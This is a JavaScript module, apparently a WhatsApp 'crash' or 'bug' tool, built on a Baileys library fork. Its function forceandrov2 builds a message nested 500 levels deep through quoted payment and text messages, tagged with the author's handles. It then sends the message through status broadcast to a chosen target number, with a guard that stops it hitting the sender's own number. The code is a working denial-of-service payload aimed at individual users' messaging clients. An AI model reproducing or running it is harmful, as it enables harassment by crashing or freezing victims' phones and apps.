const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    encodeSignedDeviceIdentity,
    processTime,
    fetchLatestBaileysVersion,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function forceandrov2(sock, target) {
  if (!sock || !target) {
    console.log('[forceandrov2] missing sock or target');
    return;
  }

  // ---- Sender guard ----
  // Never let the paired number hit itself.
  try {
    const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
    const senderNum = senderRaw.split('@')[0].split(':')[0];
    const targetNum = String(target).split('@')[0].split(':')[0];
    if (senderNum && targetNum && senderNum === targetNum) {
      console.log('[forceandrov2] skipped — target equals sender (' + senderNum + ')');
      return;
    }
  } catch (_) {
    // fall through
  }

  try {
    const spamQuoted = (badzz) => {
      let quoted = { sendPaymentMessage: { amount: { value: 999, offset: 999, currencyCode: "IDR" } } };
      for (let i = 0; i < badzz; i++) {
        quoted = {
          extendedTextMessage: {
            text: "fuckedbyshahzu",
            LinkPreviewMetadata: {
              paymentExtendedMetadata: {
                contextInfo: { quotedMessage: quoted }
              }
            }
          }
        }
      }
      return quoted;
    };

    const msg = {
      extendedTextMessage: {
        text: "@shahzu_404",
        contextInfo: {
          extendedTextMessage: {
            text: "@shahzu_404",
            LinkPreviewMetadata: {
              paymentExtendedMetadata: {
                contextInfo: { quotedMessage: spamQuoted(500) }
              }
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", msg, {
      messageId: Math.random().toString(36).substring(2),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target }
                }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error('[forceandrov2]', (err && err.message) ? err.message : err);
  }
}

module.exports = { forceandrov2 };
